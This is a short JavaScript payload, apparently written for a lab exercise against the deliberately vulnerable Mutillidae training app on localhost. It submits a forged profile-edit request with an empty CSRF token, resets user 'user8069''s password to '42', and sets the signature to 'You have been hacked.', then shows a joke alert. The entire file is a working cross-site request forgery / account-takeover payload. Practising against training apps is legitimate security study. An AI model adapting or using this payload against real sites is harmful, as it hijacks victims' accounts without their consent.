function resetPW() { 
	var url = "http://127.0.0.1/mutillidae/index.php?page=edit-account-profile.php"; 
	xhr = new XMLHttpRequest(); 
	xhr.open("POST", url); 
	
	var formData = new FormData();
	formData.append("csrf-token", "");
	formData.append("username","user8069");
	formData.append("password", "42");
	formData.append("confirm_password","42");
	formData.append("my_signature","You have been hacked.");
	formData.append("edit-account-profile-php-submit-button","Update Profile");
	xhr.send(formData);
}
resetPW();
alert("PHP is the best language in the world.");